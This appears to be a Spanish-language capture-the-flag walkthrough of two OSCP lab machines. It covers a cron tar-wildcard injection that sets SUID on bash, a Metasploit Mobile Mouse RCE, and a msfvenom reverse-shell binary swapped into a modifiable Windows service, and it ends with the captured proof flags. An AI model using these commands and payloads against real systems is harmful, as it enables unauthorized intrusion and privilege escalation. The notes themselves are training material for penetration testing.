ls -lah /etc/cron*                                                                                                                                                                                                
-rw-r--r-- 1 root root 1.2K Mar 23  2022 /etc/crontab                                                                                                                                                             
                                                                                                                                                                                                                  
/etc/cron.d:                                                                                                                                                                                                      
total 20K                                                                                                                                                                                                         
drwxr-xr-x  2 root root 4.0K Nov 22  2022 .                                                                                                                                                                       
drwxr-xr-x 99 root root 4.0K Nov 22  2022 ..                                                                                                                                                                      
-rw-r--r--  1 root root  102 Mar 23  2022 .placeholder                                                                                                                                                            
-rw-r--r--  1 root root  115 Nov 22  2022 2minutes                                                                                                                                                                
-rw-r--r--  1 root root  201 Jan  8  2022 e2scrub_all 

sh-5.1$ cat /etc/cron.d/2minutes
cat /etc/cron.d/2minutes
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
*/2 * * * * root cd /opt/admin && tar -zxf /tmp/backup.tar.gz *

echo $PATH                                                                                                                                                                                                        
/bin:/usr/bin:/sbin:/usr/sbin:/usr/local/bin:/bin:/usr/bin:/sbin:/usr/sbin:/usr/local/bin:/sbin:/usr/sbin:/bin:/usr/bin                                                                                           
sh-5.1$ ls -la /bin                                                                                                                                                                                               
ls -la /bin                                                                                                                                                                                                       
lrwxrwxrwx 1 root root 7 Apr 21  2022 /bin -> usr/bin
```

1. https://vk9-sec.com/exploiting-the-cron-jobs-misconfigurations-privilege-escalation/

2. [https://www.exploit-db.com/papers/33930](Paper exploit DB)

```bash
┌──(root㉿kali)-[/home/…/Challenges/6_OSCP-C/Standalone-Machines/Charlie]
└─# nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.45.152] from (UNKNOWN) [192.168.210.157] 37784
sh: cannot set terminal process group (1018): Inappropriate ioctl for device
sh: no job control in this shell
sh-5.1$ cd /opt/admin
cd /opt/admin
sh-5.1$ echo "/bin/chmod 4755 /bin/bash" > shell.sh
echo "/bin/chmod 4755 /bin/bash" > shell.sh
sh-5.1$ echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > "--checkpoint-action=exec=sh shell.sh"
sh-5.1$ echo "" > --checkpoint=1
echo "" > --checkpoint=1
sh-5.1$ /bin/bash -p
/bin/bash -p
whoami
root
cat /root/proof.txt
c4ce13088bb92a7993443ed57660e114
```

## Pascha

* Enumeracion:

```bash
Nmap scan report for 192.168.193.157
Host is up (0.16s latency).
Not shown: 996 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.45.152
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 114      120          4096 Nov 02  2022 backup
22/tcp    open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0e:ad:d7:de:60:2b:49:ef:42:3b:1e:76:9c:77:33:85 (ECDSA)
|_  256 99:b5:48:fb:77:df:18:b0:1d:ad:e0:92:f3:e1:26:0d (ED25519)
80/tcp    open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.52 (Ubuntu)
20000/tcp open  http    MiniServ 1.820 (Webmin httpd)
|_http-server-header: MiniServ/1.820
|_http-title: Site doesn't have a title (text/html; Charset=utf-8).
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 4 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 587/tcp)
HOP RTT       ADDRESS
-   Hops 1-3 are the same as for 192.168.193.156
4   199.12 ms 192.168.193.157

Nmap scan report for 192.168.193.155
Host is up (0.17s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Microsoft IIS httpd 10.0
|_http-title: IIS Windows
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
9099/tcp open  unknown
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest: 
|     HTTP/1.0 200 OK 
|     Server: Mobile Mouse Server 
|     Content-Type: text/html 
|     Content-Length: 321
|_    <HTML><HEAD><TITLE>Success!</TITLE><meta name="viewport" content="width=device-width,user-scalable=no" /></HEAD><BODY BGCOLOR=#000000><br><br><p style="font:12pt arial,geneva,sans-serif; text-align:center; color:green; font-weight:bold;" >The server running on "OSCP" was able to receive your request.</p></BODY></HTML>
9999/tcp open  abyss?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9099-TCP:V=7.95%I=7%D=8/26%Time=68ADF59D%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,1A2,"HTTP/1\.0\x20200\x20OK\x20\r\nServer:\x20Mobile\x20Mouse\
SF:x20Server\x20\r\nContent-Type:\x20text/html\x20\r\nContent-Length:\x203
SF:21\r\n\r\n<HTML><HEAD><TITLE>Success!</TITLE><meta\x20name=\"viewport\"
SF:\x20content=\"width=device-width,user-scalable=no\"\x20/></HEAD><BODY\x
SF:20BGCOLOR=#000000><br><br><p\x20style=\"font:12pt\x20arial,geneva,sans-
SF:serif;\x20text-align:center;\x20color:green;\x20font-weight:bold;\"\x20
SF:>The\x20server\x20running\x20on\x20\"OSCP\"\x20was\x20able\x20to\x20rec
SF:eive\x20your\x20request\.</p></BODY></HTML>\r\n")%r(FourOhFourRequest,1
SF:A2,"HTTP/1\.0\x20200\x20OK\x20\r\nServer:\x20Mobile\x20Mouse\x20Server\
SF:x20\r\nContent-Type:\x20text/html\x20\r\nContent-Length:\x20321\r\n\r\n
SF:<HTML><HEAD><TITLE>Success!</TITLE><meta\x20name=\"viewport\"\x20conten
SF:t=\"width=device-width,user-scalable=no\"\x20/></HEAD><BODY\x20BGCOLOR=
SF:#000000><br><br><p\x20style=\"font:12pt\x20arial,geneva,sans-serif;\x20
SF:text-align:center;\x20color:green;\x20font-weight:bold;\"\x20>The\x20se
SF:rver\x20running\x20on\x20\"OSCP\"\x20was\x20able\x20to\x20receive\x20yo
SF:ur\x20request\.</p></BODY></HTML>\r\n");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 10 (92%)
OS CPE: cpe:/o:microsoft:windows_10
Aggressive OS guesses: Microsoft Windows 10 1903 - 21H1 (92%), Microsoft Windows 10 1909 - 2004 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
-   Hops 1-3 are the same as for 192.168.193.156
4   199.24 ms 192.168.193.155

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Aug 26 15:01:03 2025 -- 3 IP addresses (3 hosts up) scanned in 283.64 seconds

```

* Buscamos el exploit para Mobile Mouse

```bash
┌──(root㉿kali)-[/home/…/Challenges/6_OSCP-C/Standalone-Machines/Pascha]
└─# searchsploit "Mobile Mouse"
--------------------------------------------------------------- ---------------------------------
 Exploit Title                                                 |  Path
--------------------------------------------------------------- ---------------------------------
Mobile Mouse 3.6.0.4 - Remote Code Execution (RCE)             | windows/remote/51010.py
--------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
> A pesar de haber modificado el epxloit no obtenemos resultados e intentamos con **MSF**

```bash
msf6 exploit(windows/misc/mobile_mouse_rce) > run
[*] Started reverse TCP handler on 192.168.45.152:4444 
[*] 192.168.187.155:9099 - Running automatic check ("set AutoCheck false" to disable)
[*] 192.168.187.155:9099 - Client name set to: AcF7m
[*] 192.168.187.155:9099 - Connecting
[+] 192.168.187.155:9099 - The target appears to be vulnerable. Connected to hostname OSCP with MAC address 00:50:56:86:32:56
[*] 192.168.187.155:9099 - Client name set to: YSUCi
[*] 192.168.187.155:9099 - Connecting
[*] 192.168.187.155:9099 - Opening Command Prompt
[*] 192.168.187.155:9099 - Sending stager
[*] 192.168.187.155:9099 - Using URL: http://192.168.45.152:8080/
[+] 192.168.187.155:9099 - Payload request received, sending 73802 bytes of payload for staging
[+] 192.168.187.155:9099 - Payload request received, sending 73802 bytes of payload for staging
[*] 192.168.187.155:9099 - Opening Command Prompt again
[*] 192.168.187.155:9099 - Executing payload
[*] Sending stage (240 bytes) to 192.168.187.155
[-] 192.168.187.155:9099 - Unable to delete c:\Windows\Temp\wMAuczUdLywUO.exe
[*] Command shell session 1 opened (192.168.45.152:4444 -> 192.168.187.155:51376) at 2025-08-27 13:02:41 -0300
[*] 192.168.187.155:9099 - Server stopped.
[!] 192.168.187.155:9099 - This exploit may require manual cleanup of 'c:\Windows\Temp\wMAuczUdLywUO.exe' on the target


Shell Banner:
Microsoft Windows [Version 10.0.19045.2251]
-----
          

C:\Windows\Temp>
C:\Windows\Temp>cd C:\Users
cd C:\Users

C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 4CF3-17AD

 Directory of C:\Users

11/14/2022  03:41 AM    <DIR>          .
11/14/2022  03:41 AM    <DIR>          ..
11/14/2022  04:59 AM    <DIR>          Administrator
11/03/2022  12:54 PM    <DIR>          Offsec
11/03/2022  12:45 PM    <DIR>          Public
11/14/2022  05:20 AM    <DIR>          Tim
               0 File(s)              0 bytes
               6 Dir(s)  17,202,135,040 bytes free

C:\Users\Tim\Desktop>type local.txt
type local.txt
90f87aa3cb2e01693be46d0a96ec012d

C:\Users\Tim\Desktop>
```

#### Escalamos privilegios

* Cargamos winpeas y al ejecutarlo encntramos lo siguiente: 

```bash
����������͹ Modifiable Services
� Check if you can modify any service https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#services
    LOOKS LIKE YOU CAN MODIFY OR START/STOP SOME SERVICE/s:
    GPGOrchestrator: AllAccess <-- EXPLORAR ESTO!
    RmSvc: GenericExecute (Start/Stop)
    wcncsvc: GenericExecute (Start/Stop)
    BcastDVRUserService_617cc: GenericExecute (Start/Stop)
    ConsentUxUserSvc_617cc: GenericExecute (Start/Stop)
    CredentialEnrollmentManagerUserSvc_617cc: GenericExecute (Start/Stop)
    DeviceAssociationBrokerSvc_617cc: GenericExecute (Start/Stop)
    DevicePickerUserSvc_617cc: GenericExecute (Start/Stop)
    DevicesFlowUserSvc_617cc: GenericExecute (Start/Stop)
    PimIndexMaintenanceSvc_617cc: GenericExecute (Start/Stop)
    PrintWorkflowUserSvc_617cc: GenericExecute (Start/Stop)
    UdkUserSvc_617cc: GenericExecute (Start/Stop)
    UnistoreSvc_617cc: GenericExecute (Start/Stop)
    UserDataSvc_617cc: GenericExecute (Start/Stop)
    WpnUserService_617cc: GenericExecute (Start/Stop)
```

* Despues de una buscqueda Explotamos

1. Generamos payload y servimos

```bash
┌──(root㉿kali)-[/home/…/Challenges/6_OSCP-C/Standalone-Machines/Pascha]
└─# msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.152 LPORT=80 -f exe -o GPGService.exe     
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: GPGService.exe
                                                                                                                 
┌──(root㉿kali)-[/home/…/Challenges/6_OSCP-C/Standalone-Machines/Pascha]
└─# python3 -m http.server 9001
Serving HTTP on 0.0.0.0 port 9001 (http://0.0.0.0:9001/) ...
192.168.187.155 - - [27/Aug/2025 17:22:51] "GET /GPGService.exe HTTP/1.1" 200 -

```

2. Levantamos un receptor en el puerto 80

```bash
┌──(root㉿kali)-[/home/…/Challenges/6_OSCP-C/Standalone-Machines/Pascha]
└─# nc -lvnp 80  
listening on [any] 80 ...
```

3. Renombramos el binario asociado al servicio:

```powershell
PS C:\Program Files\MilleGPG5> dir
dir

    Directory: C:\Program Files\MilleGPG5

Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----        11/14/2022   2:55 AM                k-platform                                                           
d-----        11/14/2022   4:04 AM                log                                                                  
d-----        11/14/2022   2:52 AM                MariaDB                                                              
d-----        11/14/2022   2:53 AM                plugin                                                               
-a----         10/6/2022   7:39 AM       10022912 Analisi.dll                                                          
-a----         7/28/2022   3:00 AM       10898176 Engine.dll                                                           
-a----         10/6/2022   7:39 AM        5125504 GPGConnector.exe                                                     
-a----         10/6/2022   7:39 AM       13635968 GPGNetwork.exe                                                       
-a----         3/24/2021   3:33 AM       11227552 GPGService.exe                                                       
-a----         10/6/2022   7:39 AM        9432064 InvioCloud.dll                                                       
-a----         10/6/2022   7:39 AM        9371136 InvioNetwork.dll                                                     
-a----         10/6/2022   7:39 AM       18179968 MilleGPG5.exe                                                        
-a----         10/6/2022   7:39 AM       13364608 MilleGPG5Patient.exe                                                 
-a----         10/6/2022   7:39 AM       67031040 Sincro.dll                                                           
-a----          3/5/2020   5:49 AM       12297456 TeamViewerQS.exe                                                     
-a----        11/14/2022   2:57 AM          78350 Uninstall.exe                                                        

PS C:\Program Files\MilleGPG5> Rename-Item GPGService.exe GPGService.bak
Rename-Item GPGService.exe GPGService.bak
```

4. Solicitamos el binario

```powershell
PS C:\Program Files\MilleGPG5> iwr -uri http://192.168.45.152:9001/GPGService.exe -Outfile GPGService.exe
iwr -uri http://192.168.45.152:9001/GPGService.exe -Outfile GPGService.exe
```
5. Detenemos el servicio y volvemos a iniciarlo
```powershell
PS C:\Program Files\MilleGPG5> Stop-Service -Name GPGOrchestrator
Stop-Service -Name GPGOrchestrator
PS C:\Program Files\MilleGPG5> Start-Service -Name GPGOrchestrator
Start-Service -Name GPGOrchestrator
```

6. En el receptor:

```bash
connect to [192.168.45.152] from (UNKNOWN) [192.168.187.155] 52498
Microsoft Windows [Version 10.0.19045.2251]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>cd C:\Users\Administrator\Desktop                 
cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 4CF3-17AD

 Directory of C:\Users\Administrator\Desktop

11/14/2022  07:06 AM    <DIR>          .
11/14/2022  07:06 AM    <DIR>          ..
08/27/2025  06:31 AM                34 proof.txt
               1 File(s)             34 bytes
               2 Dir(s)  17,116,213,248 bytes free

C:\Users\Administrator\Desktop>type proof.txt
type proof.txt
5db1db2e6e43c8c8e22c845ac823c142

```
